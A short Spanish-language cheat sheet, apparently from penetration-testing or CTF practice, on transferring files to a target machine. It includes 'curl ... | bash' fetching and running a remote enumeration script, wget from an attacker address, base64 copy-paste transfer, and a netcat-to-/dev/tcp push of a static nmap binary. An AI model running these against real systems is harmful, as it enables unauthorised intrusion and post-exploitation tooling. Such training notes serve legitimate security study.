Obtener un fichero desde un equipo:
`wget http://10.10.14.19/lse.sh`
Obtener un fichero desde un equipo y pasárselo a bash para que lo interprete:
`curl -s http://10.10.14.19/lse.sh | bash`

Pasar un fichero en base64 a una máquina Linux:
> En local --> `cat recon.sh | base64 -w 0 | xclip -sel clip`
> En la máquina objetivo --> `echo "<hash_base64>" | base64 -d > recon.sh`

Transferir fichero estático de nmap (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
> En local --> `nc -nlvp 443 < nmap`
> En la máquina objetivo --> `cat > nmap < /dev/tcp/10.9.6.44/443`
> Comparamos hashes con 'md5sum' para comprobar que la data es idéntica



